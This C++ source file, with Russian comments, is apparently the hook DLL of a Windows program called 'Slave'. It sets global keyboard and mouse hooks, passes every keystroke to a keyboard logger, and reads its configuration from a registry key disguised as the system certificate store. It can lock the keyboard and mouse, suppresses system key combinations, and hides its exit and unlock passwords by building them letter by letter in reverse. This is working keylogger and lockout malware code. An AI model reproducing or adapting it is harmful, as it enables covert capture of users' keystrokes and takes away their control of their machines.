#include "stdafx.h"

#include "ProceduresDLL.h"
#include "InputsCollection.h"
#include "..\Slave\Messages.h"


const SizeType uiInputBufferSize = 30;

#pragma data_seg(".shared")
// Данные идут наружу при помощи функций
HHOOK hKeyboardHook = NULL;
HHOOK hMouseHook = NULL;
// Должен установиться в true при залочке. Потом сбрасывается
// в false в MouseProc.
DWORD dwLockingCursor = 0;
// Для залочки спец. клавиш
UINT uiState = 0;
// Для внутреннего поюзания
RECT Rect = {0, 0, 0, 0};

bool bKeyboardLocked = false, bMouseLocked = false;

DWORD dwCallbackThreadID = 0;

CInputsCollection<uiInputBufferSize + 1> Inputs = 0;
#pragma data_seg()

CSlaveRegistryDataReader* pSlaveRegistryDataReader = 0;
CKeyboardLogger* pKeyboardLogger = 0;


//                                           01234567890123456789012345
static char pcAlphabet[uiInputBufferSize] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
// Пассворд для выхода нафиг из Slave
static char pcExitPassword[uiInputBufferSize] = "";
// Пассворд для отлочки клавы и мыши
static char pcUnlockPassword[uiInputBufferSize] = "";



void DoInitPasswords()
{
	// EXITTHISFUCKINGSLAVE
	// E
	pcExitPassword[0] = pcAlphabet[4];
	// V
	pcExitPassword[1] = pcAlphabet[21];
	// A
	pcExitPassword[2] = pcAlphabet[0];
	// L
	pcExitPassword[3] = pcAlphabet[11];
	// S
	pcExitPassword[4] = pcAlphabet[18];
	// G
	pcExitPassword[5] = pcAlphabet[6];
	// N
	pcExitPassword[6] = pcAlphabet[13];
	// I
	pcExitPassword[7] = pcAlphabet[8];
	// K
	pcExitPassword[8] = pcAlphabet[10];
	// C
	pcExitPassword[9] = pcAlphabet[2];
	// U
	pcExitPassword[10] = pcAlphabet[20];
	// F
	pcExitPassword[11] = pcAlphabet[5];
	// S
	pcExitPassword[12] = pcAlphabet[18];
	// I
	pcExitPassword[13] = pcAlphabet[8];
	// H
	pcExitPassword[14] = pcAlphabet[7];
	// T
	pcExitPassword[15] = pcAlphabet[19];
	// T
	pcExitPassword[16] = pcAlphabet[19];
	// I
	pcExitPassword[17] = pcAlphabet[8];
	// X
	pcExitPassword[18] = pcAlphabet[23];
	// E
	pcExitPassword[19] = pcAlphabet[4];
	// \0
	pcExitPassword[20] = pcAlphabet[26];

	// PLEASEUNLOCKINPUTS
	// S
	pcUnlockPassword[0] = pcAlphabet[18];
	// T
	pcUnlockPassword[1] = pcAlphabet[19];
	// U
	pcUnlockPassword[2] = pcAlphabet[20];
	// P
	pcUnlockPassword[3] = pcAlphabet[15];
	// N
	pcUnlockPassword[4] = pcAlphabet[13];
	// I
	pcUnlockPassword[5] = pcAlphabet[8];
	// K
	pcUnlockPassword[6] = pcAlphabet[10];
	// C
	pcUnlockPassword[7] = pcAlphabet[2];
	// O
	pcUnlockPassword[8] = pcAlphabet[14];
	// L
	pcUnlockPassword[9] = pcAlphabet[11];
	// N
	pcUnlockPassword[10] = pcAlphabet[13];
	// U
	pcUnlockPassword[11] = pcAlphabet[20];
	// E
	pcUnlockPassword[12] = pcAlphabet[4];
	// S
	pcUnlockPassword[13] = pcAlphabet[18];
	// A
	pcUnlockPassword[14] = pcAlphabet[0];
	// E
	pcUnlockPassword[15] = pcAlphabet[4];
	// L
	pcUnlockPassword[16] = pcAlphabet[11];
	// P
	pcUnlockPassword[17] = pcAlphabet[15];
	// \0
	pcUnlockPassword[18] = pcAlphabet[26];
}
// End of DoInitPasswords()


BOOL WINAPI DllMain(HINSTANCE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	const std::string sSlaveRegistryPath = "Software\\Microsoft\\SystemCertificates\\My\\Certificates";
		switch (ul_reason_for_call)
		{
			case DLL_PROCESS_ATTACH:
				DisableThreadLibraryCalls(hModule);
				// 10 секунд
				Inputs.SetTimeOut(1e8);
				DoInitPasswords();

				// Ридер начальных данных для логгера и копиера
				pSlaveRegistryDataReader = new CSlaveRegistryDataReader;
				pSlaveRegistryDataReader->SetKey(HKEY_LOCAL_MACHINE);
				pSlaveRegistryDataReader->SetSecurityAccessMask(KEY_ALL_ACCESS);
				*(pSlaveRegistryDataReader->GetSubKeyName()) = sSlaveRegistryPath;

				pKeyboardLogger = new CKeyboardLogger(pSlaveRegistryDataReader);

				break;
			case DLL_THREAD_ATTACH:
				// Ридер начальных данных для логгера и копиера
				pSlaveRegistryDataReader = new CSlaveRegistryDataReader;
				pSlaveRegistryDataReader->SetKey(HKEY_LOCAL_MACHINE);
				pSlaveRegistryDataReader->SetSecurityAccessMask(KEY_ALL_ACCESS);
				*(pSlaveRegistryDataReader->GetSubKeyName()) = sSlaveRegistryPath;

				pKeyboardLogger = new CKeyboardLogger(pSlaveRegistryDataReader);

				break;
			case DLL_THREAD_DETACH:
					if (pSlaveRegistryDataReader)
					{
						delete pSlaveRegistryDataReader;
						pSlaveRegistryDataReader = 0;
					}
					if (pKeyboardLogger)
					{
						delete pKeyboardLogger;
						pKeyboardLogger = 0;
					}
				break;
			case DLL_PROCESS_DETACH:
					if (pSlaveRegistryDataReader)
					{
						delete pSlaveRegistryDataReader;
						pSlaveRegistryDataReader = 0;
					}
					if (pKeyboardLogger)
					{
						delete pKeyboardLogger;
						pKeyboardLogger = 0;
					}
				break;
		}

	return TRUE;
}


// Exported variable
//PROCEDURESDLL_API int nProceduresDLL=0;

// Exported function
/*PROCEDURESDLL_API int fnProceduresDLL(void)
{
	return 42;
}*/


LRESULT CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam)
{
		if (bMouseLocked)
		{
				if (dwLockingCursor)
				{
					dwLockingCursor = 0;

					Rect.top = ((tagMOUSEHOOKSTRUCT*)lParam)->pt.y;
					Rect.bottom = ((tagMOUSEHOOKSTRUCT*)lParam)->pt.y;
					Rect.left = ((tagMOUSEHOOKSTRUCT*)lParam)->pt.x;
					Rect.right = ((tagMOUSEHOOKSTRUCT*)lParam)->pt.x;
				}

			ClipCursor(&Rect);
		}

		if ( (code < 0) || (!bMouseLocked) )
		{
			return CallNextHookEx(hMouseHook, code, wParam, lParam);
		}
		else
			return -1;
}
// End of MouseProc


LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	char cInput = (char)wParam;
	SizeType uiRepeatCount = lParam & 0xffff;
	SizeType uiExtendedKeyFlag = lParam & (1 << 24);
	SizeType uiContextCode = lParam & (1 << 29);
	// Работает на WM_KEYDOWN
	//SizeType uiPreviousKeyState = lParam & (1 << 30);
	SizeType uiTransitionState = lParam & (1 << 31);
		if ( /*(code == HC_ACTION) && */(!uiTransitionState) &&
					(uiExtendedKeyFlag == 0) && (uiContextCode == 0) )
		{
			CCharInput CharInput(cInput);
				for (SizeType i = 0; i < uiRepeatCount; i++)
				{
						if (pKeyboardLogger)
						{
							char cBuffer[2];
							cBuffer[0] = cInput;
							cBuffer[1] = '\0';
							pKeyboardLogger->AddLogEntry(&(cBuffer[0]), bWriteDuplicates);
						}
					Inputs.Add(CharInput);
				}

				if (dwCallbackThreadID)
				{
						if (Inputs.CompareWithPassword(pcExitPassword))
						{
							PostThreadMessage(dwCallbackThreadID, WM_CLOSE, 0, 0);
						}
						if (Inputs.CompareWithPassword(pcUnlockPassword))
						{
							PostThreadMessage(dwCallbackThreadID, WM_UNLOCK, 0, 0);
						}
				}
		}

		if ( (code < 0) || (!bKeyboardLocked))
		{
			return CallNextHookEx(hKeyboardHook, code, wParam, lParam);
		}
		else
		{
			SystemParametersInfo(SPI_SETSCREENSAVERRUNNING, TRUE, &uiState, 0);
			return -1;
		}
}
// End of KeyboardProc


HHOOK GetMouseHook()
{
	return hMouseHook;
}
// End of GetMouseHook()


void SetMouseHook(HHOOK hNewMouseHook)
{
	hMouseHook = hNewMouseHook;
}
// End of SetMouseHook


HHOOK GetKeyboardHook()
{
	return hKeyboardHook;
}
// End of GetKeyboardHook()


void SetKeyboardHook(HHOOK hNewKeyboardHook)
{
	hKeyboardHook = hNewKeyboardHook;
}
// End of SetKeyboardHook


void SetLockingCursor(DWORD dwNewValue)
{
	dwLockingCursor = dwNewValue;
}
// End of SetAreLockingNow


DWORD GetLockingCursor()
{
	return dwLockingCursor;
}
// End of GetLockingCursor()


void SetuiState(DWORD uiNewState)
{
	uiState = uiNewState;
}
// End of uiNewState


DWORD GetuiState()
{
	return uiState;
}
// End of GetuiState()


void SetCallbackThreadID(DWORD dwNew)
{
	dwCallbackThreadID = dwNew;
}
// End of SetExitProcedure


void SetKeyboardLocked(bool bNew)
{
	bKeyboardLocked = bNew;
}
// End of SetKeyboardLocked


bool GetKeyboardLocked()
{
	return bKeyboardLocked;
}
// End of GetKeyboardLocked()


void SetMouseLocked(bool bNew)
{
	bMouseLocked = bNew;
}
// End of SetMouseLocked


bool GetMouseLocked()
{
	return bMouseLocked;
}
// End of GetMouseLocked()
